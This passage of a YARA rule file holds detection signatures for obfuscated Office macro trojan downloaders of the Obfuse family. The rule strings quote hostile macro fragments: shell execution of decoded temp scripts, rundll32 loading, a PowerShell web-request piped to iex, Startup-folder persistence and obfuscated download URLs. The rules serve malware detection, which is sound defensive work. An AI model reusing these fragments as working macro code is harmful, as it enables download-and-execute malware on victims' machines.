        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = " = \"\"\"m\" + \"s\" + \"h\" + \"ta\"\"" ascii //weight: 1
        $x_1_2 = {25 32 30 25 32 30 40 6a 2e 6d 70 2f 6c 6f 76 65 32 34 32 34 32 6b 61 64 61 32 72 3f 00 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_2_3 = "https\" + \"://%6786d78asd\" + \"%6786d78asd%\" + \"6786d78asd%6786d78asd@j.mp\" + " ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_1_*))) or
            ((1 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_RO_2147749502_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RO!MTB"
        threat_id = "2147749502"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {25 34 30 25 34 30 25 34 30 25 34 30 25 34 30 25 34 30 40 6a 2e 6d 70 2f 61 73 64 67 68 61 73 64 35 36 37 61 73 64 67 68 22 4f 00 74 61 20 68 74 74 70 3a 2f 2f}  //weight: 2, accuracy: Low
        $x_1_2 = {25 32 30 25 32 30 40 6a 2e 6d 70 2f 3f 00 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_3 = {20 3d 20 22 6d 22 0d 0a [0-15] 20 3d 20 22 73 22 0d 0a [0-15] 20 3d 20 22 68 22 0d 0a [0-15] 20 3d 20 22 74 22 0d 0a [0-15] 20 3d 20 22 61 [0-3] 22}  //weight: 1, accuracy: Low
        $x_2_4 = "h\" + \"t\" + \"t\" + \"p\" + \"s\" + \":\" + \"/\" + \"/\" + \"j\" + \".\" + \"m\" + \"p\" + \"/\" +" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_1_*))) or
            ((1 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_SC_2147749575_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SC!MTB"
        threat_id = "2147749575"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 46 69 65 6c 64 73 2e 49 74 65 6d 28 [0-3] 29 2e 4f 4c 45 46 6f 72 6d 61 74 2e 4f 62 6a 65 63 74 2e 47 72 6f 75 70 4e 61 6d 65}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 49 74 65 6d 28 29 2e 44 6f 63 75 6d 65 6e 74 2e 41 70 70 6c 69 63 61 74 69 6f 6e 2e 53 68 65 6c 6c 45 78 65 63 75 74 65 20 [0-32] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = "\"C:\\Windows\\System32\", Null, 0 * 1" ascii //weight: 1
        $x_1_4 = {4d 69 64 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 50 61 72 61 67 72 61 70 68 73 28 [0-48] 29 2e 52 61 6e 67 65 2e 54 65 78 74 20 26 20 22 22 2c}  //weight: 1, accuracy: Low
        $x_1_5 = {4d 69 64 28 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 50 61 72 61 67 72 61 70 68 73 28 [0-32] 29 2e 52 61 6e 67 65 2e 54 65 78 74 2c 20 [0-16] 2c}  //weight: 1, accuracy: Low
        $x_1_6 = "= \"\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SC_2147749575_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SC!MTB"
        threat_id = "2147749575"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "For Each prop In ActiveDocument.BuiltInDocumentProperties" ascii //weight: 1
        $x_1_2 = {49 66 20 70 72 6f 70 2e 4e 61 6d 65 20 3d 20 22 [0-16] 22 20 54 68 65 6e}  //weight: 1, accuracy: Low
        $x_1_3 = {66 6f 75 6e 64 5f 76 61 6c 75 65 20 3d 20 4d 69 64 28 70 72 6f 70 2e 56 61 6c 75 65 2c 20 [0-2] 29}  //weight: 1, accuracy: Low
        $x_1_4 = "orig_val = Base64Decode(found_value)" ascii //weight: 1
        $x_1_5 = "orig_val = Base64Decode(orig_val)" ascii //weight: 1
        $x_1_6 = "Set fso = CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_7 = "tmp_folder = fso.GetSpecialFolder(2)" ascii //weight: 1
        $x_1_8 = "tmp_name = tmp_folder + \"\\\" + fso.GetTempName() + \".cmd\"" ascii //weight: 1
        $x_1_9 = "Set f = fso.createTextFile(tmp_name)" ascii //weight: 1
        $x_1_10 = "f.Write (orig_val)" ascii //weight: 1
        $x_1_11 = "CreateObject(\"WScript.Shell\").Run tmp_name, 0" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SD_2147749589_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SD!MTB"
        threat_id = "2147749589"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 46 69 65 6c 64 73 2e 49 74 65 6d 28 [0-3] 29 2e 4f 4c 45 46 6f 72 6d 61 74 2e 4f 62 6a 65 63 74 2e 47 72 6f 75 70 4e 61 6d 65}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 49 74 65 6d 28 29 2e 44 6f 63 75 6d 65 6e 74 2e 41 70 70 6c 69 63 61 74 69 6f 6e 2e 53 68 65 6c 6c 45 78 65 63 75 74 65 20 [0-32] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = "\"C:\\Windows\\System32\", Null, 0 * 1" ascii //weight: 1
        $x_1_4 = {54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 50 61 72 61 67 72 61 70 68 73 28 [0-64] 29 2e 52 61 6e 67 65 2e 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_5 = "= \"\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SD_2147749589_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SD!MTB"
        threat_id = "2147749589"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"C:\\Windows\\System32\\rundll32.exe \" & Environ(\"TEMP\") & \"\\powershdll.dll,main" ascii //weight: 1
        $x_1_2 = "= Environ(\"TEMP\") & \"\\powershdll.dll\"" ascii //weight: 1
        $x_1_3 = "#If Win64 Then" ascii //weight: 1
        $x_1_4 = {7b 20 49 6e 76 6f 6b 65 2d 57 65 62 52 65 71 75 65 73 74 20 2d 75 73 65 62 20 68 74 74 70 3a 2f 2f [0-3] 2e [0-3] 2e [0-3] 2e [0-3] 2f [0-5] 2e 70 73 31 20 7d 20 5e 7c 20 69 65 78 3b 22}  //weight: 1, accuracy: Low
        $x_1_5 = {26 20 43 68 72 24 28 56 61 6c 28 22 26 [0-3] 22 20 26 20 4d 69 64 24 28 [0-16] 2c 20 [0-16] 2c 20 32 29 29 29}  //weight: 1, accuracy: Low
        $x_1_6 = {3d 20 31 20 54 6f 20 4c 65 6e 28 [0-16] 29 20 53 74 65 70 20 32}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RP_2147749673_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RP!MTB"
        threat_id = "2147749673"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Val(\"&H\" & (Mid$(" ascii //weight: 1
        $x_1_2 = "= Asc(Mid$(" ascii //weight: 1
        $x_1_3 = "= Chr(Asc(Mid(" ascii //weight: 1
        $x_1_4 = {3d 20 52 65 70 6c 61 63 65 28 [0-96] 2c 20 22 [0-96] 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 52 75 6e 20 22 22 20 2b 20 [0-96] 20 2b 20 22 20 22 20 2b}  //weight: 1, accuracy: Low
        $x_1_6 = {3d 20 31 20 54 6f 20 4c 65 6e 28 [0-96] 29 [0-32] 4d 69 64 28}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_CY_2147749739_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.CY!eml"
        threat_id = "2147749739"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "eml: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Set er = CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = "er.Run x, bbb" ascii //weight: 1
        $x_1_3 = "bbb = Left(\"0187654324567786543jhgfddfghkjgfdsjhgfbdcs4532\", 1)" ascii //weight: 1
        $x_1_4 = {78 20 3d 20 52 65 70 6c 61 63 65 28 78 2c 20 22 [0-21] 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_CY_2147749739_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.CY!eml"
        threat_id = "2147749739"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "eml: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Set Lokerd = CreateObject(Siko & Ediy & Ribdes)" ascii //weight: 1
        $x_1_2 = "Rdfctu = PhIk(Prtcv_7, \".txt\", \".\" & Trabtr & Bijnme & Trabtr & \"e\")" ascii //weight: 1
        $x_1_3 = "Application.StartupPath & Knrft7 & \"hh_9.2.1_\" & Trabtr & \".txt\"" ascii //weight: 1
        $x_1_4 = "= Trabtr & \"S\" & Trabtr & \"h\" & Trabtr & \"el\" & Trabtr & \"l\"" ascii //weight: 1
        $x_1_5 = "= Trabtr & \"R\" & Trabtr & \"u\" & Trabtr & \"n\"" ascii //weight: 1
        $x_1_6 = "= CallByName(Lokerd, ParkS, VbMethod, Chr(Tiberd8) & Rdfctu & Chr(Tiberd8) & \" \" & numero, 1)" ascii //weight: 1
        $x_1_7 = " = Replace(d, i, e)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LHB_2147749762_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LHB!MTB"
        threat_id = "2147749762"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 49 6e 74 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 22 [0-37] 22 29 2e 56 61 6c 75 65 20 26 20 4d 69 64 28 [0-32] 2c 20 [0-32] 2c 20 32 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 22 [0-37] 22 29 2e 56 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_3 = "Shell " ascii //weight: 1
        $x_1_4 = {47 6f 54 6f 20 [0-32] 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LLB_2147749800_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LLB!MTB"
        threat_id = "2147749800"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 65 74 73 28 22 [0-16] 22 29 2e 43 65 6c 6c 73 28 [0-3] 2c 20 [0-2] 29 2e 56 61 6c 75 65 3a}  //weight: 1, accuracy: Low
        $x_1_2 = {53 68 65 6c 6c 20 [0-192] 45 78 69 74 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 43 4c 6e 67 28 [0-32] 20 26 20 4d 69 64 28 [0-32] 2c 20 [0-32] 2c 20 32 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {47 6f 54 6f 20 [0-21] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_P_2147749823_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.P!MSR"
        threat_id = "2147749823"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Environ(\"USERPROFILE\") & \"\\\\\" & Rnd & \".jse" ascii //weight: 1
        $x_1_2 = "= CreateObject(\"Shell.Application\")" ascii //weight: 1
        $x_1_3 = ".ShellExecute someShe, \"\", \"C:\\\", \"open\", 1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SE_2147749831_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SE!MTB"
        threat_id = "2147749831"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 46 69 65 6c 64 73 2e 49 74 65 6d 28 [0-3] 29 2e 4f 4c 45 46 6f 72 6d 61 74 2e 4f 62 6a 65 63 74 2e 47 72 6f 75 70 4e 61 6d 65}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 50 61 72 61 67 72 61 70 68 73 28 [0-69] 29 2e 52 61 6e 67 65 2e 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 49 74 65 6d 28 29 2e 44 6f 63 75 6d 65 6e 74 2e 41 70 70 6c 69 63 61 74 69 6f 6e 2e 53 68 65 6c 6c 45 78 65 63 75 74 65 20 [0-32] 2c}  //weight: 1, accuracy: Low
        $x_1_4 = "C:\\Windows\\System32\", Null, 0 * 1" ascii //weight: 1
        $x_1_5 = "= \"\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SF_2147749868_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SF!MTB"
        threat_id = "2147749868"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 46 69 65 6c 64 73 2e 49 74 65 6d 28 [0-3] 29 2e 4f 4c 45 46 6f 72 6d 61 74 2e 4f 62 6a 65 63 74 2e 47 72 6f 75 70 4e 61 6d 65}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 50 61 72 61 67 72 61 70 68 73 28 [0-85] 29 2e 52 61 6e 67 65 2e 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 49 74 65 6d 28 29 2e 44 6f 63 75 6d 65 6e 74 2e 41 70 70 6c 69 63 61 74 69 6f 6e 2e 53 68 65 6c 6c 45 78 65 63 75 74 65 20 [0-32] 2c 20 [0-32] 20 26 20 [0-32] 2c 20 [0-32] 2c 20 4e 75 6c 6c 2c 20 30 20 2a}  //weight: 1, accuracy: Low
        $x_1_4 = "= Mid(\"\" & \"\" & \"\" & \"\" & \"\" & " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SG_2147749927_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SG!MSR"
        threat_id = "2147749927"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "XE1pY3Jvc29mdFxXaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3RhcnR1cFxhZ2VudC5leGU=" ascii //weight: 1
        $x_1_2 = {22 61 48 52 30 63 44 6f 76 4c 7a [0-62] 79 64 57 35 6b 62 47 77 7a 4d 69 35 6c 65 47 55 3d 22}  //weight: 1, accuracy: Low
        $x_1_3 = "CStr(Environ(\"AppData\")" ascii //weight: 1
        $x_1_4 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_5 = "CreateObject(\"Microsoft.XMLHTTP\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LLC_2147749948_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LLC!MTB"
        threat_id = "2147749948"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 22 [0-21] 22 29 2e 56 61 6c 75 65 3a}  //weight: 1, accuracy: Low
        $x_1_2 = "Shell " ascii //weight: 1
        $x_1_3 = {3d 20 43 4c 6e 67 28 [0-32] 20 26 20 4d 69 64 28 [0-32] 2c 20 [0-32] 2c 20 32 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {47 6f 54 6f 20 [0-21] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PA_2147749949_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PA!MSR"
        threat_id = "2147749949"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= JnRuy8 & \"Ru\" & JnRuy8 & \"n" ascii //weight: 1
        $x_1_2 = "= JnRuy8 & \"Sh\" & JnRuy8 & \"el\" & JnRuy8 & \"l" ascii //weight: 1
        $x_1_3 = "= Application.StartupPath & \"\\..\" & \"\\..\\\" & \"Redco\" & 1 & JnRuy8 & \".blah" ascii //weight: 1
        $x_1_4 = "= CallByName(CreateObject(\"Scripting.FileSystemObject\"), \"CreateT\" & JnRuy8 & \"extFile\", VbMethod, Ikoltgi)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PB_2147749992_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PB!MSR"
        threat_id = "2147749992"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {67 65 74 2d 69 63 6f 6e 73 2e 64 64 6e 73 2e 6e 65 74 2f [0-80] 2f 2f 61 75 74 6f 69 6e 64 65 78 2e 70 68 70}  //weight: 1, accuracy: Low
        $x_1_2 = ".CreateTextFile(AppPaths + \"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\templates.vbs\", True, True)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LBC_2147750004_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LBC!MTB"
        threat_id = "2147750004"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Val(\"&H\" & (Mid$(DataIn, (2 * lonDataPtr)" ascii //weight: 1
        $x_1_2 = "= Asc(Mid$(CodeKey, ((lonDataPtr Mod Len(CodeKey)) + 1), 1))" ascii //weight: 1
        $x_1_3 = "= Chr(Asc(Mid(strInput, i, 1))" ascii //weight: 1
        $x_1_4 = {3d 20 52 65 70 6c 61 63 65 28 [0-96] 2c 20 22 [0-96] 22 2c 20 22 22 29 [0-21] 2e 52 75 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LHC_2147750042_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LHC!MTB"
        threat_id = "2147750042"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 28 28 28 [0-2] 20 2a 20 28 41 73 63 28 4d 69 64 28 53 68 65 65 74 73 28 22 [0-16] 22 29 2e 43 65 6c 6c 73 28 [0-4] 2c 20 [0-3] 29 2e 56 61 6c 75 65 2c 20 [0-16] 2c 20 [0-2] 29 29 29 20 2d 20 [0-3] 29 20 2b 20 [0-3] 29 20 2f 20 [0-3] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3c 3d 20 4c 65 6e 28 53 68 65 65 74 73 28 22 [0-16] 22 29 2e 43 65 6c 6c 73 28 [0-4] 2c 20 [0-3] 29 2e 56 61 6c 75 65 29 20 54 68 65 6e}  //weight: 1, accuracy: Low
        $x_1_3 = "Shell " ascii //weight: 1
        $x_1_4 = {47 6f 54 6f 20 [0-32] 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_AZ_2147750047_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.AZ!eml"
        threat_id = "2147750047"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "eml: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 45 78 65 63 75 74 65 28 30 2c 20 76 62 4e 75 6c 6c 53 74 72 69 6e 67 2c 20 22 6e 65 74 22 2c 20 22 75 73 65 [0-10] 26 20 55 52 4c 2c 20 22 25 77 69 6e 64 69 72 25 5c 73 79 73 74 65 6d 33 32 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
        $x_1_2 = "lSuccess = ShellExecute(0, \"Open\", URL)" ascii //weight: 1
        $x_1_3 = "Set objNetwork = CreateObject(\"WScript.Network\")" ascii //weight: 1
        $x_1_4 = "UpdatedURL = RootURL & Base64Encode(FillURL)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LHD_2147750092_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LHD!MTB"
        threat_id = "2147750092"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 28 28 28 [0-2] 20 2a 20 28 41 73 63 28 4d 69 64 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 22 [0-32] 22 29 2e 56 61 6c 75 65 2c 20 [0-16] 2c 20 [0-2] 29 29 29 20 2d 20 [0-2] 29 20 2b 20 [0-2] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3c 3d 20 4c 65 6e 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 22 [0-32] 22 29 2e 56 61 6c 75 65 29 20 54 68 65 6e}  //weight: 1, accuracy: Low
        $x_1_3 = "Shell " ascii //weight: 1
        $x_1_4 = {47 6f 54 6f 20 [0-32] 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_AV_2147750197_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.AV!eml"
        threat_id = "2147750197"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "eml: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
